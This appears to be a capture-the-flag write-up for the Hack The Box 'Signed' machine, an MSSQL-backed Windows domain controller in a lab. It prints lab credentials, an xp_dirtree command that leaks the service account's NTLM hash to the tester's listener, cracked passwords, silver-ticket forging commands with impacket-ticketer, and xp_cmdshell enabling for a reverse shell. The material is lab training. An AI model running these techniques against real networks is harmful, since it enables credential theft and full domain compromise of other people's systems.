---
title: 'HTB-Signed'
published: 2025-10-16
draft: false
toc: true
tags: ["mssql"]
---

```
Scope:
10.10.11.90

Credentials:
scott
Sm230#C5NatH
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -Pn -T5 -vvvv --min-rate=5000 10.10.11.90

PORT     STATE SERVICE  REASON  VERSION
1433/tcp open  ms-sql-s syn-ack Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-16T07:20:52+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

## 1433/TCP - MSSQL

Using the given credentials we are able to login using `impacket`:

![](attachments/29d1d82b949ea1b5b7298a555f85a43a.png)

We quickly find out that we have insufficient privs:

![](attachments/d1b85a1649358e29882a2bcbffe16e95.png)

Let's start off by enumerating the db's first:

![](attachments/bcaa8e5c290b68caa22784ddb65cf71c.png)

Our user can't impersonate anyone else:

![](attachments/ebf16384d010f52fe190925dc2e6c8b6.png)

### metasploit

In order to automate the process we can use `msfconsole` instead with the following module:

![](attachments/24a5825d665157036967b484d03b9620.png)

Funny enough the module tells us `xp_cmdshell` is in fact enabled

![](attachments/7c6f61172c98963aa7115fb929355cfb.png)

![](attachments/36798f9e9958e71acd527a4b3edb90c1.png)

We find another service account:

![](attachments/7cf18a22748431f9cc31fe470ee0e4da.png)

I then used another module to enumerate all domain users since it seemed domain-linked:

![](attachments/0c9a2f1390f2a526f320dcf1ad897c75.png)

### XP_Dirtree Hash Stealing

Using the following command, in combination with `responder` we can steal the hash of *mssqlsvc*. 

```sql
xp_dirtree \\10.10.14.4\test
```

![](attachments/9531d8be8414dd4cc1f821d32b69dbd3.png)

Using `john` we can easily crack the hash:

![](attachments/30dfba447aa1e2489cbf2297c876e513.png)

```
mssqlsvc
purPLE9795!@
```

Using `impacket` we can now log in with this user:

![](attachments/0b09d2dd59e558192979d4e6e31cff0b.png)

Unfortunately we still can not execute commands freely.

# Foothold
## Silver Ticket

What we can do however is craft up a silver ticket. We'll need the following for this:

- SPN password hash
- Domain SID
- Target SPN

We can find the SID

![](attachments/8c466a3b801f72de36df61f4e20df481.png)

Since this isn't human readable I generated a `python` script using AI which I then used to make it readable:

```python
#!/usr/bin/env python3
"""
Convert SQL/varbinary-style SIDs (e.g. b'0105000000...') or hex strings into the
human-readable Windows SID form: S-<revision>-<identifier-authority>-<subauth>-...

Usage (CLI):
    python3 sid_parse.py "b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'"

Or feed plain hex:
    python3 sid_parse.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000

Or import:
    from sid_parse import parse_sid, domain_sid, rid_from_sid
"""
import sys
import re
from typing import Tuple, List


def _normalize_input(s: str) -> bytes:
    """
    Accepts:
      - "b'01050000...'"
      - "0x01050000..."
      - "01050000..."
      - raw bytes representation (not typical from SQL)
    Returns bytes interpreted from hex.
    """
    if isinstance(s, bytes):
        return s

    s = s.strip()

    # SQL output often looks like: b'0105000000000005...'
    m = re.match(r"^b'([0-9a-fA-F]+)'\s*$", s)
    if m:
        hexstr = m.group(1)
        return bytes.fromhex(hexstr)

    # Remove potential 0x prefix
    if s.startswith("0x") or s.startswith("0X"):
        s = s[2:]

    # If it's plain printable hex (even length), use it
    if re.fullmatch(r"[0-9a-fA-F]+", s) and len(s) % 2 == 0:
        return bytes.fromhex(s)

    # Last resort: try to remove non-hex characters and decode
    cleaned = re.sub(r"[^0-9a-fA-F]", "", s)
    if len(cleaned) % 2 == 1:
        raise ValueError("Hex string has odd length after cleaning.")
    return bytes.fromhex(cleaned)


def parse_sid(input_value: str) -> str:
    """
    Parse the binary SID and return the textual SID e.g. S-1-5-21-...
    Accepts SQL varbinary-like strings and plain hex strings.
    """
    b = _normalize_input(input_value)
    if len(b) < 8:
        raise ValueError("Binary SID too short.")

    rev = b[0]
    sub_count = b[1]
    id_auth = int.from_bytes(b[2:8], "big")

    # Validate length
    expected_len = 8 + (4 * sub_count)
    if len(b) < expected_len:
        raise ValueError(f"Binary SID shorter than expected for {sub_count} subauthorities.")

    subs: List[int] = []
    offset = 8
    for i in range(sub_count):
        sub = int.from_bytes(b[offset:offset + 4], "little", signed=False)
        subs.append(sub)
        offset += 4

    sid_parts = ["S", str(rev), str(id_auth)] + [str(x) for x in subs]
    return "-".join(sid_parts)


def domain_sid(sid_text: str) -> str:
    """
    Return the domain SID (everything except the last RID).
    Example:
      input:  S-1-5-21-4088429403-1159899800-2753317549-1105
      output: S-1-5-21-4088429403-1159899800-2753317549
    """
    parts = sid_text.split("-")
    if len(parts) < 4:
        raise ValueError("SID format unexpected.")
    # remove last element (RID)
    return "-".join(parts[:-1])


def rid_from_sid(sid_text: str) -> str:
    parts = sid_text.split("-")
    if len(parts) < 4:
        raise ValueError("SID format unexpected.")
    return parts[-1]


def _cli_main(argv):
    if len(argv) < 2:
        print("Usage: sid_parse.py <hex-sid-or-SQL-b'...'> [more values...]")
        sys.exit(2)

    for token in argv[1:]:
        try:
            sid = parse_sid(token)
        except Exception as e:
            print(f"[ERROR] Could not parse '{token}': {e}")
            continue

        dom = domain_sid(sid)
        rid = rid_from_sid(sid)
        print(f"Input: {token}")
        print(f" SID : {sid}")
        print(f" DOM : {dom}")
        print(f" RID : {rid}")
        print("-" * 60)


if __name__ == "__main__":
    _cli_main(sys.argv)
```

This worked like a charm when testing the IT group:

![](attachments/296122ef772ba5887396679f22bf68a3.png)

### ticketer

Using this knowledge we can use `impacket-ticketer` to create a silver ticket.

```bash
impacket-ticketer -nthash <controledSPNUserNT> -domain-sid <targetdomainSID> -domain <targetDomain> -spn <SPN service> -user-id <impersonateuserSID> -groups <impersonateGroup> <impersonateUsername>
```

To form the `nthash` we can use the following method:

![](attachments/21aa72df8a76def8dc34666a1699308a.png)

![](attachments/d5b85363634f2d58ce8425e7f644fa21.png)

```bash
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn mssql/dc01.signed.htb -groups 1105 IT
```

Now we can save the ticket:

![](attachments/5fda0d502c2a71238f5b2e520e5dbeec.png)

![](attachments/abaf59bc8b8ecc95660c005c977abee9.png)

Using the forged ticket we can now login as the administrator account:

![](attachments/041d81ac4f4b5bc7beddc5c4e8a6da68.png)

## Reverse Shell as mssqlsvc

Using the following commands we get ourselves a reverse shell:

```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell '<cmd>'
```

![](attachments/9dd4d3b9b61035fc0f1796745a91e01b.png)

![](attachments/3e9bd1cb7878c77afae49969c261750b.png)

### user.txt

![](attachments/da66fdc8e5d88a20b56d857716e194c1.png)

# Privilege Escalation
## File Read - UNINTENDED way

>[!warning]
>While this is the UNINTENDED way according to the box creator, this still works and also shows that the target is vulnerable to this attack:
>
>![](attachments/cc5762350734925e6bedb681520c1212.png)

We find the user SID

![](attachments/0f1ed3a0ea1b10490fd97e22049640d2.png)

Having this knowledge we can use `ticketer` again:

```bash
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn mssql/dc01.signed.htb -groups 1105,512,519 -user-id 1103 mssqlsvc
```

![](attachments/940ce957e2a4d0a050a1d7126994f5c2.png)

Using the above command we have created a ticket where we impersonate ourselves as an Administrative account. This way we can achieve file read:

![](attachments/b7f3eca4d7c2942c2b1f712cc959df59.png)

While this didn't work, the following did:

![](attachments/5783cf60dfca6f6a390348ac8ca62cf8.png)

![](attachments/6f081466f4897451d889ddca9cdd4bc9.png)

---